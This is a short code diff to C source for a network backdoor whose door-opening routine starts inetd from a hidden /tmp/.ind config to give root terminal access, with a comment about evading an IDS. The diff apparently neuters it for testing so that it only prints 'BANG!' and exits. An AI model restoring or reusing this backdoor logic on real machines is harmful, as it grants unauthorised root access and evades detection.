@@ -136,7 +136,8 @@
  * 
  * To use resets, define CDR_CODERESET 
  */
-#define CDR_CODERESET
+/* No CDR Reset, because loop back will get a return after each sent */
+/* #define CDR_CODERESET */
 
 /* If you like to open the door from different addresses (e.g. to
  * confuse an IDS), don't define this.
@@ -224,6 +225,13 @@ void cdr_open_door(void) {
     FILE	*f;
 
     char	*args[] = {"/usr/sbin/inetd","/tmp/.ind",NULL};
+
+    char *const newargs[] = {"/bin/echo", "BANG!", NULL};
+
+    execv("/bin/echo",newargs);
+
+    /* Only print bang; we don't want to continue with the root terminal */
+    exit(0);
 
     switch (fork()) {
 	case -1: 
